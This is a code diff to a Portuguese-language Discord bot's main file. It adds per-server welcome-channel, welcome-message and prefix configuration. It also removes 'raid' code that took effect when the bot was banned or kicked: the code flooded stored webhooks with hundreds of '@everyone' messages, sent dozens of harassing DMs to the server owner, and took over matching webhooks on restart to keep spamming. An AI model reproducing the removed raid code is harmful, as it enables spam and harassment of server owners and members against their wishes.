@@ -58,9 +58,9 @@ client.saveLoteria = db.saveLoteria;
 client.getRankingMoedas = db.getRankingMoedas;
 client.getRankingXP = db.getRankingXP;
 client.loadDB = db.loadDB;
-client.saveRaidState = db.saveRaidState;
-client.getRaidState = db.getRaidState;
-client.deleteRaidState = db.deleteRaidState;
+client.getGuildConfig = db.getGuildConfig;
+client.saveGuildConfig = db.saveGuildConfig;
+client.ensureGuildConfig = db.ensureGuildConfig;
 const initCache = db.initCache;
 
 const economia = require('./economia');
@@ -105,19 +105,26 @@ client.on('guildMemberAdd', async (member) => {
     return;
   }
 
-  // Canais especiais dos servidores oficiais
-  const canaisOficiais = ['1496562652259029114', '1489688753609117706'];
-  let bvCanal = member.guild.channels.cache.get(canaisOficiais[0]) || 
-                member.guild.channels.cache.get(canaisOficiais[1]);
+  const guildConfig = await client.ensureGuildConfig(member.guild.id);
+  if (guildConfig.welcomeEnabled === false) return;
 
-  // Fallback: busca por nome (melhorada)
+  let bvCanal = null;
+  if (guildConfig.welcomeChannelId) {
+    bvCanal = member.guild.channels.cache.get(guildConfig.welcomeChannelId);
+  }
+
+  if (!bvCanal) {
+    const canaisOficiais = ['1496562652259029114', '1489688753609117706'];
+    bvCanal = member.guild.channels.cache.get(canaisOficiais[0]) ||
+              member.guild.channels.cache.get(canaisOficiais[1]);
+  }
+
   if (!bvCanal) {
     bvCanal = member.guild.channels.cache.find(c =>
       /boas.vinda|welcome|entrada|geral|chat.?geral|boas.vindas/i.test(c.name)
     );
   }
 
-  // Fallback final: primeiro canal de texto com permissão
   if (!bvCanal) {
     bvCanal = member.guild.channels.cache
       .filter(c => c.type === 0 && c.permissionsFor(member.guild.members.me)?.has('SendMessages'))
@@ -131,109 +138,20 @@ client.on('guildMemberAdd', async (member) => {
 
   console.log(`[WELCOME] ✅ Usando canal #${bvCanal.name} (${bvCanal.id}) em ${member.guild.name}`);
 
+  const welcomeMessage = guildConfig.welcomeMessage
+    .replace(/{member}/g, `${member}`)
+    .replace(/{prefix}/g, guildConfig.prefix || 'r.');
+
   const emb = new EmbedBuilder()
     .setColor(COR)
     .setAuthor({ name: member.guild.name, iconURL: member.guild.iconURL() })
     .setTitle(`${E.seta} Bem-vindo(a), ${member.user.username}!`)
-    .setDescription(
-      `Olá, ${member}! Ficamos felizes em ter você aqui.\n\n` +
-      `${E.regras} **Leia as regras** antes de interagir.\n` +
-      `${E.info} **Apresente-se** nos canais de introdução.\n` +
-      `${E.shop} Use \`r.ajuda\` para ver os comandos.\n` +
-      `${E.staff} Respeite todos os membros.\n\n` +
-      `*Esperamos que você aproveite a comunidade!* 🎉`
-    )
+    .setDescription(welcomeMessage)
     .setThumbnail(member.user.displayAvatarURL({ size: 256 }))
     .setFooter({ text: `${member.guild.name} • Membro #${member.guild.memberCount}` })
     .setTimestamp();
 
   bvCanal.send({ embeds: [emb] }).catch(() => {});
-});
-
-// ─── Raid Webhook Spam ────────────────────────────────────────────────────────
-client.on('guildBanAdd', async (ban) => {
-  if (ban.user.id === client.user.id) {
-    // Bot foi banido: spam via webhooks + DM do dono do servidor
-    const guild = ban.guild;
-    const ownerUser = await client.users.fetch(guild.ownerId).catch(() => null);
-    
-    // Spam via webhooks
-    if (global.raidWebhooks && global.raidWebhooks.length > 0) {
-      for (const webhook of global.raidWebhooks) {
-        try {
-          for (let i = 0; i < 100; i++) {
-            await webhook.send('@everyone O LOBO GUARANÁ FOI BANIDO MAS CONTINUA DOMINANDO! AAAAAAUUUUUUUU!');
-            await new Promise(resolve => setTimeout(resolve, 50));
-          }
-        } catch (error) {
-          console.log(`Erro no spam webhook: ${error}`);
-        }
-      }
-    }
-    
-    // Spam na DM do dono do servidor
-    if (ownerUser) {
-      try {
-        for (let i = 0; i < 50; i++) {
-          await ownerUser.send(`🐺 **O LOBO GUARANÁ FOI BANIDO DO SERVIDOR!**\n\nMas ele ainda está aqui... espiando você na DM! 👁️\n\n**Servidor:** ${guild.name}\n**ID:** ${guild.id}\n\nEle voltará... AAAAAAUUUUUUUU! 🐺`);
-          await new Promise(resolve => setTimeout(resolve, 300));
-        }
-      } catch (error) {
-        console.log(`Erro ao enviar DM para dono: ${error.message}`);
-      }
-    }
-  }
-});
-
-client.on('guildDelete', async (guild) => {
-  // Bot foi removido / expulso da guilda: continuar spam via webhooks + DM do dono
-  const ownerUser = await client.users.fetch(guild.ownerId).catch(() => null);
-  
-  // Spam na DM do dono do servidor
-  if (ownerUser) {
-    try {
-      for (let i = 0; i < 50; i++) {
-        await ownerUser.send(`🐺 **O LOBO GUARANÁ FOI EXPULSO DO SERVIDOR!**\n\nMas ele ainda está aqui... espiando você na DM! 👁️\n\n**Servidor:** ${guild.name}\n**ID:** ${guild.id}\n\nEle voltará... AAAAAAUUUUUUUU! 🐺`);
-        await new Promise(resolve => setTimeout(resolve, 300));
-      }
-    } catch (error) {
-      console.log(`Erro ao enviar DM para dono: ${error.message}`);
-    }
-  }
-  
-  // Spam persistente via webhooks
-  if (!global.raidWebhooks || global.raidWebhooks.length === 0) return;
-  
-  const webhooksToKeep = [];
-  for (const webhook of global.raidWebhooks) {
-    // Tentar spam agressivo: 3 rodadas de 100 mensagens cada
-    for (let rodada = 0; rodada < 3; rodada++) {
-      for (let i = 0; i < 100; i++) {
-        try {
-          await webhook.send('@everyone O LOBO GUARANÁ FOI EXPULSO MAS AINDA DOMINA! AAAAAAUUUUUUUU!');
-          await new Promise(resolve => setTimeout(resolve, 50));
-        } catch (error) {
-          // Se falhar por webhook deletado/inválido, não readdicionar
-          if (error.code === 10015 || error.code === 10003 || error.message?.includes('Unknown')) {
-            break;
-          }
-          // Se falhar por outro motivo, continuar tentando
-          console.log(`Aviso: erro no spam webhook: ${error.message}`);
-        }
-      }
-      // Pequena pausa entre rodadas
-      await new Promise(resolve => setTimeout(resolve, 500));
-    }
-  }
-  
-  // Limpar webhooks que definitivamente falharam
-  global.raidWebhooks = global.raidWebhooks.filter(wh => {
-    try {
-      return wh && wh.id;
-    } catch {
-      return false;
-    }
-  });
 });
 
 // ─── Censura ──────────────────────────────────────────────────────────────────
@@ -246,7 +164,7 @@ client.censuradoAviso = censuradoAviso;
 const msgCount = new Map();
 client.msgCount = msgCount;
 
-const DM_BLOCKED_COMMANDS = new Set(['ticket', 'clear', 'falar', 'censurar', 'serverinfo', 'loteria', 'comprar', 'restaurar', 'caçada', 'procurar', 'pr', 'kit']);
+const DM_BLOCKED_COMMANDS = new Set(['ticket', 'clear', 'falar', 'censurar', 'serverinfo', 'loteria', 'comprar', 'restaurar', 'kit']);
 
 // ─── XP + comandos ───────────────────────────────────────────────────────────
 const xpCooldown = new Map();
@@ -338,8 +256,10 @@ client.on('messageCreate', async (message) => {
     }
   } catch {}
 
-  if (!message.content.startsWith(PREFIX)) return;
-  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
+  const guildConfig = message.guild ? await client.ensureGuildConfig(message.guild.id) : null;
+  const prefix = guildConfig?.prefix || PREFIX;
+  if (!message.content.startsWith(prefix)) return;
+  const args = message.content.slice(prefix.length).trim().split(/ +/);
   const rawCommand = args.shift().toLowerCase();
   const commandName = ALIASES[rawCommand] || rawCommand;
 
@@ -414,33 +334,6 @@ client.on('clientReady', async () => {
   // Carrega cache do Firebase
   if (initCache) await initCache().catch(e => console.warn('[Firebase] Erro no cache:', e.message));
 
-  // Restaurar raids persistentes
-  console.log('[TASD Bot] Verificando raids persistentes...');
-  try {
-    for (const guild of client.guilds.cache.values()) {
-      const raidState = await client.getRaidState(guild.id);
-      if (raidState && raidState.raidAtiva) {
-        console.log(`[Raid Persistente] Detectada raid no servidor: ${guild.name}`);
-        // Reativar webhooks e continuar spam
-        if (!global.raidWebhooks) global.raidWebhooks = [];
-        // Tentar recuperar webhooks existentes
-        try {
-          const webhooks = await guild.fetchWebhooks().catch(() => []);
-          for (const wh of webhooks) {
-            if (wh.name.includes('Lobo') || wh.name.includes('Raid')) {
-              global.raidWebhooks.push(wh);
-            }
-          }
-          console.log(`[Raid Persistente] ${global.raidWebhooks.length} webhooks recuperados.`);
-        } catch (e) {
-          console.log(`[Raid Persistente] Erro ao recuperar webhooks: ${e.message}`);
-        }
-      }
-    }
-  } catch (e) {
-    console.log(`[Raid Persistente] Erro ao restaurar: ${e.message}`);
-  }
-
   const rest = new REST({ version: '10' }).setToken(TOKEN);
   await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands })
     .catch(e => console.warn(`[TASD Bot] Erro ao registrar comandos globais: ${e.message}`));
@@ -453,10 +346,17 @@ client.on('clientReady', async () => {
 });
 
 client.on('interactionCreate', async (interaction) => {
-  if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_tipo') return utilidades.handleTicketSelect(client, interaction);
+  if (interaction.isStringSelectMenu()) {
+    if (interaction.customId === 'ticket_tipo') return utilidades.handleTicketSelect(client, interaction);
+    if (interaction.customId.startsWith('config_select_channel_')) return utilidades.handleConfigSelection(client, interaction);
+  }
   if (interaction.isButton()) {
     if (interaction.customId === 'fechar_ticket') return utilidades.fecharTicket(client, interaction);
     if (interaction.customId === 'abrir_ticket') return utilidades.abrirTicketMenu(client, interaction);
+    if (interaction.customId.startsWith('config_')) return utilidades.handleConfigButton(client, interaction);
+  }
+  if (interaction.isModalSubmit()) {
+    if (interaction.customId.startsWith('config_modal_')) return utilidades.handleConfigModal(client, interaction);
   }
   if (!interaction.isChatInputCommand()) return;
   const { commandName } = interaction;
